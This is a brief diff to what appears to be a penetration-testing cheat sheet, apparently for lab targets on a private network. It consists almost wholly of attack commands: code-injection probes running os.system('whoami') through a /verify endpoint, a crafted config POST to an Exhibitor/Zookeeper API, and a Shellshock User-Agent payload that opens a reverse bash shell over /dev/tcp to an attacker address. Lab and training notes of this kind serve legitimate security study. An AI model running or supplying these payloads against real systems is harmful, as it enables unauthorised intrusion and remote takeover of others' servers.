@@ -30,5 +30,10 @@ curl http://192.168.200.5/verify -d "code=2*9"
 curl http://192.168.200.5/verify -d "code=os"
 curl http://192.168.200.5/verify -d "code=os.system('whoami')
 
+Datafile for Exploit (Zookeeper)
+vim data.json   ..{ "zookeeperInstallDirectory": "/opt/zookeeper", "Data": "/zookeeper/data",...}
+curl -X POST -d @data.json http://192.168.200.5:8080/exhibitor/v1/config/set 
+{"message":"OK","succeeded":true}   
+
 Shellshock
 curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.119.154/PORT 0>&1' http://192.168.200.5/bad.txt
